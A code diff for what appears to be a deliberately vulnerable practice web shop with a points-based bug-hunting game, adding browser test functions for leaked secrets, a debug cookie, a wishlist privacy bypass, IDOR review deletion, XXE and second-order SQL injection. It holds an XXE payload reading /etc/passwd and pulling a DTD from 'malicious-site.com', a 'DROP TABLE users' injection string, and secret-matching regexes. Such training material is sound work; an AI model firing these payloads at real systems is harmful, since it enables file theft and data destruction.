@@ -518,9 +518,450 @@ export const testQuantityAndRateLimit = async (): Promise<void> => {
   }, 2000);
 };
 
+// 🚨 Bug 1: Hidden API Token in Source Maps Detection
+export const testSourceMapSecrets = async (): Promise<void> => {
+  console.log('🔍 Testing Source Map Secrets Detection...');
+  
+  try {
+    // Check for vulnerable source map file
+    const response = await fetch('/vulnerable-sourcemap.js');
+    const content = await response.text();
+    
+    // Patterns to detect common secret formats
+    const secretPatterns = [
+      /sk-[a-zA-Z0-9]{32,}/g,  // Stripe keys
+      /AKIA[0-9A-Z]{16}/g,     // AWS access keys
+      /secret_[a-zA-Z0-9]+/g,  // Generic secrets
+      /api[_-]?key[_-]?[a-zA-Z0-9]+/gi,  // API keys
+      /token[_-]?[a-zA-Z0-9]+/gi,        // Tokens
+      /password[_-]?[a-zA-Z0-9]+/gi      // Passwords
+    ];
+    
+    let foundSecrets = [];
+    for (const pattern of secretPatterns) {
+      const matches = content.match(pattern);
+      if (matches) {
+        foundSecrets.push(...matches);
+      }
+    }
+    
+    if (foundSecrets.length > 0) {
+      console.log('🎯 Found secrets in source map:', foundSecrets);
+      
+      const bugData = {
+        bug_found: 'SOURCE_MAP_SECRETS',
+        message: '🎉 Bug Found: Hidden API Token in Source Maps!',
+        description: `Found ${foundSecrets.length} exposed secrets in source maps: ${foundSecrets.slice(0, 2).join(', ')}...`,
+        points: 85
+      };
+
+      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+        (window as any).checkAndShowBugNotification(bugData);
+        console.log('✅ Source map secrets bug notification triggered');
+      }
+    } else {
+      console.log('ℹ️ No secrets found in source maps');
+    }
+    
+  } catch (error) {
+    console.error('❌ Source map secrets test failed:', error);
+  }
+};
+
+// 🚨 Bug 2: Debug Flag Cookie Detection
+export const testDebugCookie = (): void => {
+  console.log('🍪 Testing Debug Cookie Detection...');
+  
+  // Set debug cookie to simulate the vulnerability
+  document.cookie = 'debug=true; path=/';
+  
+  // Check for debug cookie
+  const cookies = document.cookie.split(';');
+  const debugCookie = cookies.find(cookie => cookie.trim().startsWith('debug=true'));
+  
+  if (debugCookie) {
+    console.log('🎯 Debug cookie detected:', debugCookie);
+    
+    const bugData = {
+      bug_found: 'DEBUG_COOKIE',
+      message: '🎉 Bug Found: Debug Flag Cookie Detected!',
+      description: 'Debug mode enabled via cookie, potentially exposing sensitive information',
+      points: 70
+    };
+
+    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+      (window as any).checkAndShowBugNotification(bugData);
+      console.log('✅ Debug cookie bug notification triggered');
+    }
+  }
+};
+
+// 🚨 Bug 3: Wishlist Privacy Bypass Detection
+export const testWishlistPrivacyBypass = (wishlistName: string): boolean => {
+  console.log('🔐 Testing Wishlist Privacy Bypass...');
+  
+  // Check for the hidden debug string
+  const bypassStrings = ['debug_public', 'make_public', 'admin_access', 'bypass_privacy'];
+  const foundBypass = bypassStrings.some(bypass => wishlistName.toLowerCase().includes(bypass));
+  
+  if (foundBypass) {
+    console.log('🎯 Wishlist privacy bypass detected in name:', wishlistName);
+    
+    const bugData = {
+      bug_found: 'WISHLIST_PRIVACY_BYPASS',
+      message: '🎉 Bug Found: Wishlist Privacy Bypass Detected!',
+      description: 'Special string in wishlist name bypasses privacy settings',
+      points: 75
+    };
+
+    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+      (window as any).checkAndShowBugNotification(bugData);
+      console.log('✅ Wishlist privacy bypass bug notification triggered');
+    }
+    
+    return true;
+  }
+  
+  return false;
+};
+
+// 🚨 Bug 4: IDOR Review Deletion Testing
+export const testIDORReviewDeletion = async (reviewId: number): Promise<void> => {
+  console.log(`🗑️ Testing IDOR Review Deletion for review ID: ${reviewId}...`);
+  
+  try {
+    const token = localStorage.getItem('access_token');
+    if (!token) {
+      console.log('⚠️ Please log in first to test review deletion');
+      return;
+    }
+
+    const response = await fetch(`http://localhost:8000/api/products/reviews/delete/${reviewId}/`, {
+      method: 'DELETE',
+      headers: {
+        'Authorization': `Bearer ${token}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    const data = await response.json();
+    console.log('Review deletion response:', data);
+    
+    if (data.bug_found === 'IDOR_REVIEW_DELETE') {
+      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+        (window as any).checkAndShowBugNotification(data);
+        console.log('✅ IDOR review deletion bug notification triggered');
+      }
+    }
+    
+  } catch (error) {
+    console.error('❌ IDOR review deletion test failed:', error);
+  }
+};
+
+// 🚨 Bug 5: XXE Testing
+export const testXXEInjection = async (): Promise<void> => {
+  console.log('⚠️ Testing XXE Injection...');
+  
+  try {
+    const token = localStorage.getItem('access_token');
+    if (!token) {
+      console.log('⚠️ Please log in first to test XXE injection');
+      return;
+    }
+
+    // Malicious XML with XXE payload
+    const maliciousXML = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE product [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://malicious-site.com/evil.dtd">
+  %dtd;
+]>
+<products>
+  <product>
+    <name>Test Product &xxe;</name>
+    <description>XXE Test</description>
+  </product>
+</products>`;
+
+    const response = await fetch('http://localhost:8000/api/products/admin/import/', {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${token}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        xml_content: maliciousXML
+      })
+    });
+    
+    const data = await response.json();
+    console.log('XXE test response:', data);
+    
+    if (data.bug_found === 'XXE_INJECTION') {
+      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+        (window as any).checkAndShowBugNotification(data);
+        console.log('✅ XXE injection bug notification triggered');
+      }
+    }
+    
+  } catch (error) {
+    console.error('❌ XXE injection test failed:', error);
+  }
+};
+
+// 🚨 Bug 6: Second-Order SQL Injection Testing
+export const testSecondOrderSQLInjection = async (): Promise<void> => {
+  console.log('💉 Testing Second-Order SQL Injection...');
+  
+  try {
+    // Step 1: Store malicious search term
+    const maliciousPayload = "test'; DROP TABLE users; --";
+    
+    await fetch('http://localhost:8000/api/products/analytics/store-search/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        search_term: maliciousPayload
+      })
+    });
+    
+    console.log('Stored malicious search term:', maliciousPayload);
+    
+    // Step 2: Trigger the second-order injection by retrieving popular searches
+    const response = await fetch('http://localhost:8000/api/products/analytics/popular-searches/');
+    const data = await response.json();
+    
+    console.log('Popular searches response:', data);
+    
+    if (data.bug_found === 'SECOND_ORDER_SQL_INJECTION') {
+      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+        (window as any).checkAndShowBugNotification(data);
+        console.log('✅ Second-order SQL injection bug notification triggered');
+      }
+    }
+    
+  } catch (error) {
+    console.error('❌ Second-order SQL injection test failed:', error);
+  }
+};
+
 // Make the new testing functions globally accessible
 if (typeof window !== 'undefined') {
   (window as any).testIntegerOverflow = testIntegerOverflow;
   (window as any).testRateLimiting = testRateLimiting;
   (window as any).testQuantityAndRateLimit = testQuantityAndRateLimit;
+  (window as any).testSourceMapSecrets = testSourceMapSecrets;
+  (window as any).testDebugCookie = testDebugCookie;
+  (window as any).testWishlistPrivacyBypass = testWishlistPrivacyBypass;
+  (window as any).testIDORReviewDeletion = testIDORReviewDeletion;
+  (window as any).testXXEInjection = testXXEInjection;
+  (window as any).testSecondOrderSQLInjection = testSecondOrderSQLInjection;
+}
+
+// Replace the existing initializeDebugCookieDetection function with this:
+
+const initializeDebugCookieDetection = (): void => {
+  const checkDebugCookie = () => {
+    // Get all cookies and check for debug variations
+    const cookies = document.cookie.split(';');
+    console.log('🔍 All cookies:', cookies);
+    
+    const debugCookie = cookies.find(cookie => {
+      const trimmed = cookie.trim().toLowerCase();
+      return trimmed.startsWith('debug=true') || 
+             trimmed.startsWith('debug=1') ||
+             trimmed === 'debug=true' ||
+             trimmed === 'debug=1';
+    });
+    
+    console.log('🍪 Debug cookie found:', debugCookie);
+    
+    if (debugCookie && !sessionStorage.getItem('debug_cookie_detected')) {
+      console.log('🎯 Debug cookie detected automatically:', debugCookie);
+      
+      const bugData = {
+        bug_found: 'DEBUG_COOKIE',
+        message: '🎉 Bug Found: Debug Flag Cookie Detected!',
+        description: 'Debug mode enabled via cookie, potentially exposing sensitive information',
+        points: 70
+      };
+
+      // Force the notification to show
+      if (typeof window !== 'undefined') {
+        if ((window as any).checkAndShowBugNotification) {
+          (window as any).checkAndShowBugNotification(bugData);
+        } else {
+          // Fallback: call showBugNotification directly
+          showBugNotification(bugData);
+        }
+        sessionStorage.setItem('debug_cookie_detected', 'true');
+        console.log('✅ Debug cookie notification triggered!');
+      }
+    }
+  };
+
+  // Check immediately
+  console.log('🚀 Initializing debug cookie detection...');
+  setTimeout(checkDebugCookie, 500); // Small delay to ensure page is loaded
+  
+  // Also monitor for cookie changes
+  let lastCookies = document.cookie;
+  setInterval(() => {
+    if (document.cookie !== lastCookies) {
+      lastCookies = document.cookie;
+      console.log('🔄 Cookies changed, rechecking...');
+      setTimeout(checkDebugCookie, 100);
+    }
+  }, 1000);
+};
+
+// ...existing code...
+
+// SQL Injection detection for form inputs
+const initializeSQLInjectionDetection = (): void => {
+  const sqlInjectionPatterns = [
+    /('|(\\')|(;)|(\\;)|(--)|(\s+)|(\||\\|)|(%7C)|(union|select|insert|delete|update|drop|create|alter|exec|execute))/gi,
+    /'[^']*'/g,
+    /;\s*(drop|delete|update|insert)/gi,
+    /union\s+select/gi,
+    /--\s/g,
+    /\/\*.*\*\//g
+  ];
+
+  const checkForSQLInjection = (input: string): boolean => {
+    return sqlInjectionPatterns.some(pattern => pattern.test(input));
+  };
+
+  const detectSQLInjection = (input: string, context: string) => {
+    if (checkForSQLInjection(input) && !sessionStorage.getItem('sql_injection_detected')) {
+      console.log('🎯 SQL Injection detected in:', context, 'Input:', input);
+      
+      const bugData = {
+        bug_found: 'SECOND_ORDER_SQL_INJECTION',
+        message: '🎉 Bug Found: Second-Order SQL Injection Detected!',
+        description: `Malicious SQL payload detected in ${context}: ${input.substring(0, 50)}...`,
+        points: 100
+      };
+
+      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
+        (window as any).checkAndShowBugNotification(bugData);
+        sessionStorage.setItem('sql_injection_detected', 'true');
+      }
+      
+      return true;
+    }
+    return false;
+  };
+
+  // Monitor search forms
+  const monitorSearchForms = () => {
+    const searchInputs = document.querySelectorAll('input[type="search"], input[placeholder*="search" i], input[name*="search" i]');
+    
+    searchInputs.forEach(input => {
+      const inputElement = input as HTMLInputElement;
+      
+      inputElement.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          setTimeout(() => {
+            detectSQLInjection(inputElement.value, 'search form');
+          }, 100);
+        }
+      });
+
+      // Also check on form submission
+      const form = inputElement.closest('form');
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          detectSQLInjection(inputElement.value, 'search form submission');
+        });
+      }
+    });
+  };
+
+  // Monitor review forms and textareas
+  const monitorReviewForms = () => {
+    const reviewInputs = document.querySelectorAll('textarea, input[name*="review" i], input[name*="comment" i]');
+    
+    reviewInputs.forEach(input => {
+      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
+      
+      const form = inputElement.closest('form');
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          detectSQLInjection(inputElement.value, 'review form');
+        });
+      }
+    });
+  };
+
+  // Monitor contact forms
+  const monitorContactForms = () => {
+    const contactInputs = document.querySelectorAll('input[name*="message" i], textarea[name*="message" i], input[name*="contact" i]');
+    
+    contactInputs.forEach(input => {
+      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
+      
+      const form = inputElement.closest('form');
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          detectSQLInjection(inputElement.value, 'contact form');
+        });
+      }
+    });
+  };
+
+  // Initial setup and re-run when DOM changes
+  const setupMonitoring = () => {
+    monitorSearchForms();
+    monitorReviewForms();
+    monitorContactForms();
+  };
+
+  // Setup immediately and after DOM changes
+  setupMonitoring();
+  
+  // Re-run when new elements are added to DOM
+  const observer = new MutationObserver(() => {
+    setupMonitoring();
+  });
+  
+  observer.observe(document.body, {
+    childList: true,
+    subtree: true
+  });
+};
+
+// Initialize SQL injection detection
+if (typeof window !== 'undefined') {
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initializeSQLInjectionDetection);
+  } else {
+    initializeSQLInjectionDetection();
+  }
+}
+
+// Add at the end of the file
+
+// Master initialization function
+const initializeAllBugDetection = (): void => {
+  console.log('🚀 Initializing comprehensive bug detection system...');
+  
+  // Initialize all detection systems
+  initializeDebugCookieDetection();
+ 
+  initializeSQLInjectionDetection();
+  
+  console.log('✅ All bug detection systems initialized');
+};
+
+// Auto-initialize when the script loads
+if (typeof window !== 'undefined') {
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initializeAllBugDetection);
+  } else {
+    initializeAllBugDetection();
+  }
 }
